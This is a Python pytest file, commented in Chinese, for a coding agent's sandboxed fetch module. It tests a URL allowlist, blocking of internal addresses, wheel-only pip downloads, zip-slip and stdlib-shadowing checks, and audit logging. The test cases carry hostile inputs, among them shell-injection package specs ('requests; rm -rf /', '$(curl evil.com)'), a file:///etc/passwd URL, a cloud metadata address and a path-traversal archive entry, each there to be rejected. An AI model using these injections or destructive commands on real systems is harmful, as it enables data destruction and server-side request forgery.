"""受控取件的测试：白名单、内网阻断、不执行代码、归档攻击、遮蔽防护、审计。

全部离线：不碰真实网络，pip 下载用注入的假 run_command，URL 取件用假 opener。
"""

import json
import zipfile

import pytest

from coding_agent import fetch as fetch_mod
from coding_agent.fetch import (
    FetchError,
    allowed_hosts,
    append_audit,
    audit_log_path,
    deps_python_dir,
    download_pip_wheels,
    fetch_url,
    package_name,
    unpack_wheels,
    validate_package_specs,
    validate_url,
    wheelhouse_dir,
)


# --------------------------------------------------------------------------- #
# 白名单与 URL 校验
# --------------------------------------------------------------------------- #
def test_default_allowlist_covers_the_registries_we_need():
    hosts = allowed_hosts()
    assert "pypi.org" in hosts and "files.pythonhosted.org" in hosts
    assert "registry.npmjs.org" in hosts


def test_allowlist_can_be_extended_but_deduped():
    hosts = allowed_hosts(["example.com", "PYPI.ORG", ".docs.python.org", ""])
    assert "example.com" in hosts and "docs.python.org" in hosts
    assert hosts.count("pypi.org") == 1 and hosts.count("PYPI.ORG") == 0


def test_subdomains_of_allowlisted_hosts_are_allowed(monkeypatch):
    monkeypatch.setattr(fetch_mod, "_reject_private_addresses", lambda host: None)
    assert validate_url("https://files.pythonhosted.org/packages/x.whl")


@pytest.mark.parametrize("url", [
    "http://evil.example.com/payload",          # 不在白名单
    "ftp://pypi.org/x",                          # 协议不对
    "https://user:pass@pypi.org/x",              # 带凭据
    "https://pypi.org.evil.com/x",               # 后缀伪装
    "https:///nohost",                           # 没有主机名
    "file:///etc/passwd",                        # 本地文件
])
def test_validate_url_rejects_bad_targets(url, monkeypatch):
    monkeypatch.setattr(fetch_mod, "_reject_private_addresses", lambda host: None)
    with pytest.raises(FetchError):
        validate_url(url)


@pytest.mark.parametrize("host", ["localhost", "127.0.0.1", "169.254.169.254", "10.0.0.5", "::1"])
def test_private_and_metadata_addresses_are_rejected(host):
    with pytest.raises(FetchError, match="内网|解析"):
        fetch_mod._reject_private_addresses(host)


# --------------------------------------------------------------------------- #
# 包名/版本约束校验（防参数注入）
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("spec, expected", [
    ("requests", "requests"),
    ("requests==2.31.0", "requests"),
    ("django>=4.2,<5", "django"),
    ("uvicorn[standard]==0.30.0", "uvicorn"),
])
def test_package_name_parsing(spec, expected):
    assert package_name(spec) == expected


@pytest.mark.parametrize("spec", [
    "requests; rm -rf /",           # shell 注入
    "requests --index-url http://evil",  # pip 选项注入
    "$(curl evil.com)",
    "-r requirements.txt",
    "requests==2.31.0 --extra",
    "../../etc/passwd",
])
def test_package_specs_reject_injection(spec):
    with pytest.raises(FetchError):
        package_name(spec)


def test_validate_package_specs_bounds_the_work():
    with pytest.raises(FetchError):
        validate_package_specs([])
    with pytest.raises(FetchError):
        validate_package_specs([f"pkg{i}" for i in range(21)])


# --------------------------------------------------------------------------- #
# pip 下载：参数正确 + 不执行包代码 + 失败是人话
# --------------------------------------------------------------------------- #
class _Completed:
    def __init__(self, returncode=0, stdout="", stderr=""):
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr


def test_download_uses_only_wheel_cross_platform_argv(tmp_path):
    captured = {}

    def fake_run(command, workspace):
        captured["command"] = command
        (wheelhouse_dir(workspace)).mkdir(parents=True, exist_ok=True)
        (wheelhouse_dir(workspace) / "requests-2.31.0-py3-none-any.whl").write_bytes(b"PK\x03\x04")
        return _Completed(0, "Saved requests-2.31.0-py3-none-any.whl")

    result = download_pip_wheels(tmp_path, ["requests==2.31.0"], run_command=fake_run)
    command = captured["command"]
    assert command[:4] == [command[0], "-m", "pip", "download"]
    assert "--only-binary=:all:" in command                     # 绝不下载 sdist
    assert "--platform" in command and "manylinux2014_x86_64" in command
    assert "--python-version" in command and "312" in command
    assert command[-1] == "requests==2.31.0"
    assert result["wheels"] == 1 and result["bytes"] > 0


def test_download_failure_reports_no_wheel_case(tmp_path):
    def fake_run(command, workspace):
        return _Completed(1, stderr="ERROR: No matching distribution found for foo")

    with pytest.raises(FetchError) as excinfo:
        download_pip_wheels(tmp_path, ["foo"], run_command=fake_run)
    message = str(excinfo.value)
    assert "没有 Linux wheel" in message and "No matching distribution" in message


def test_download_refuses_oversized_result(tmp_path, monkeypatch):
    monkeypatch.setattr(fetch_mod, "MAX_WHEELHOUSE_BYTES", 10)

    def fake_run(command, workspace):
        wheelhouse_dir(workspace).mkdir(parents=True, exist_ok=True)
        (wheelhouse_dir(workspace) / "big-1.0-py3-none-any.whl").write_bytes(b"x" * 64)
        return _Completed(0)

    with pytest.raises(FetchError, match="超过上限"):
        download_pip_wheels(tmp_path, ["big"], run_command=fake_run)


def test_download_writes_audit_log(tmp_path):
    def fake_run(command, workspace):
        wheelhouse_dir(workspace).mkdir(parents=True, exist_ok=True)
        (wheelhouse_dir(workspace) / "a-1.0-py3-none-any.whl").write_bytes(b"PK")
        return _Completed(0)

    download_pip_wheels(tmp_path, ["a"], run_command=fake_run)
    lines = audit_log_path(tmp_path).read_text(encoding="utf-8").strip().splitlines()
    record = json.loads(lines[-1])
    assert record["kind"] == "pip-download" and record["ok"] is True
    assert record["packages"] == ["a"] and record["wheels"] == 1


# --------------------------------------------------------------------------- #
# 解包：zip-slip / 软链接 / 标准库遮蔽
# --------------------------------------------------------------------------- #
def _make_wheel(path, members: dict[str, bytes]):
    with zipfile.ZipFile(path, "w") as archive:
        for name, data in members.items():
            archive.writestr(name, data)
    return path


def test_unpack_extracts_wheel_to_deps_python(tmp_path):
    wheelhouse = wheelhouse_dir(tmp_path)
    wheelhouse.mkdir(parents=True)
    _make_wheel(wheelhouse / "mylib-1.0-py3-none-any.whl",
                {"mylib/__init__.py": b"VALUE = 1\n", "mylib-1.0.dist-info/METADATA": b"Name: mylib"})

    result = unpack_wheels(tmp_path)
    assert result["unpacked"] == 1
    assert (deps_python_dir(tmp_path) / "mylib" / "__init__.py").read_text() == "VALUE = 1\n"
    assert result["modules"] == ["mylib"]


def test_unpack_rejects_zip_slip(tmp_path):
    wheelhouse = wheelhouse_dir(tmp_path)
    wheelhouse.mkdir(parents=True)
    _make_wheel(wheelhouse / "evil-1.0-py3-none-any.whl", {"../../pwned.py": b"x"})

    with pytest.raises(FetchError, match="越界路径"):
        unpack_wheels(tmp_path)
    assert not (tmp_path.parent / "pwned.py").exists()


def test_unpack_rejects_stdlib_shadowing(tmp_path):
    """PYTHONPATH 先于标准库：一个 json.py 就能顶替标准库，必须拒绝。"""
    wheelhouse = wheelhouse_dir(tmp_path)
    wheelhouse.mkdir(parents=True)
    _make_wheel(wheelhouse / "shadow-1.0-py3-none-any.whl", {"json.py": b"def loads(x): return 'pwned'\n"})

    with pytest.raises(FetchError, match="遮蔽"):
        unpack_wheels(tmp_path)
    assert not (deps_python_dir(tmp_path) / "json.py").exists()


def test_unpack_skips_dot_data_segments(tmp_path):
    wheelhouse = wheelhouse_dir(tmp_path)
    wheelhouse.mkdir(parents=True)
    _make_wheel(wheelhouse / "s-1.0-py3-none-any.whl",
                {"s/__init__.py": b"", "s-1.0.data/scripts/run.sh": b"#!/bin/sh\nrm -rf /"})

    unpack_wheels(tmp_path)
    assert not (deps_python_dir(tmp_path) / "s-1.0.data").exists()


# --------------------------------------------------------------------------- #
# URL 取件：白名单 + 体积上限 + 审计
# --------------------------------------------------------------------------- #
class _FakeResponse:
    def __init__(self, payload: bytes):
        self.payload = payload

    def read(self, size=None):
        return self.payload if size is None else self.payload[:size]

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


def test_fetch_url_saves_into_workspace(tmp_path, monkeypatch):
    monkeypatch.setattr(fetch_mod, "_reject_private_addresses", lambda host: None)
    opener = type("O", (), {"open": lambda self, req, timeout=None: _FakeResponse(b"hello docs")})()
    monkeypatch.setattr(fetch_mod.urllib.request, "build_opener", lambda *a, **k: opener)

    result = fetch_url(tmp_path, "https://pypi.org/simple/index.html")
    assert result["bytes"] == 10
    assert result["path"].name == "index.html"
    assert result["path"].is_file()
    assert result["path"].is_relative_to(tmp_path)
    record = json.loads(audit_log_path(tmp_path).read_text(encoding="utf-8").strip().splitlines()[-1])
    assert record["kind"] == "url-fetch" and record["host"] == "pypi.org"


def test_fetch_url_enforces_size_limit(tmp_path, monkeypatch):
    monkeypatch.setattr(fetch_mod, "_reject_private_addresses", lambda host: None)
    monkeypatch.setattr(fetch_mod, "MAX_FETCH_BYTES", 4)
    opener = type("O", (), {"open": lambda self, req, timeout=None: _FakeResponse(b"x" * 64)})()
    monkeypatch.setattr(fetch_mod.urllib.request, "build_opener", lambda *a, **k: opener)

    with pytest.raises(FetchError, match="上限"):
        fetch_url(tmp_path, "https://pypi.org/big.bin")


def test_fetch_url_rejects_non_allowlisted_before_any_request(tmp_path, monkeypatch):
    called = []
    monkeypatch.setattr(fetch_mod.urllib.request, "build_opener",
                        lambda *a, **k: called.append(1))

    with pytest.raises(FetchError, match="白名单"):
        fetch_url(tmp_path, "https://evil.example.com/x")
    assert called == []   # 校验在发起任何请求之前


def test_audit_log_is_append_only(tmp_path):
    append_audit(tmp_path, {"kind": "x", "ok": True})
    append_audit(tmp_path, {"kind": "y", "ok": False})
    lines = audit_log_path(tmp_path).read_text(encoding="utf-8").strip().splitlines()
    assert len(lines) == 2 and json.loads(lines[0])["kind"] == "x"


# --------------------------------------------------------------------------- #
# /deps 透明性：把「取过什么」摊开给用户看
# --------------------------------------------------------------------------- #
def test_deps_summary_reports_modules_and_audit(tmp_path):
    wheelhouse_dir(tmp_path).mkdir(parents=True)
    (wheelhouse_dir(tmp_path) / "demo-1.0-py3-none-any.whl").write_bytes(b"PK")
    python_dir = deps_python_dir(tmp_path)
    (python_dir / "demo").mkdir(parents=True)
    (python_dir / "demo" / "__init__.py").write_text("x = 1\n", encoding="utf-8")
    (tmp_path / ".agent-lite" / "downloads").mkdir(parents=True)
    (tmp_path / ".agent-lite" / "downloads" / "doc.txt").write_text("hi", encoding="utf-8")
    append_audit(tmp_path, {"kind": "pip-download", "ok": True, "packages": ["demo==1.0"]})
    append_audit(tmp_path, {"kind": "url-fetch", "ok": False, "url": "https://evil/x"})

    summary = fetch_mod.deps_summary(tmp_path)
    assert "demo" in summary
    assert "本地 wheel 缓存: 1 个" in summary
    assert "doc.txt" in summary
    assert "[OK ] pip-download: ['demo==1.0']" in summary
    assert "[拒绝] url-fetch: https://evil/x" in summary
    assert "pypi.org" in summary          # 白名单也摊开给用户看


def test_deps_summary_on_empty_workspace_is_honest(tmp_path):
    summary = fetch_mod.deps_summary(tmp_path)
    assert "已安装模块 0 个" in summary
    assert "还没有任何取件记录" in summary


def test_clear_deps_removes_artifacts(tmp_path):
    wheelhouse_dir(tmp_path).mkdir(parents=True)
    (wheelhouse_dir(tmp_path) / "a.whl").write_bytes(b"PK")
    deps_python_dir(tmp_path).mkdir(parents=True)
    (deps_python_dir(tmp_path) / "a.py").write_text("x", encoding="utf-8")

    fetch_mod.clear_deps(tmp_path)
    assert not deps_python_dir(tmp_path).exists()
    assert not wheelhouse_dir(tmp_path).exists()
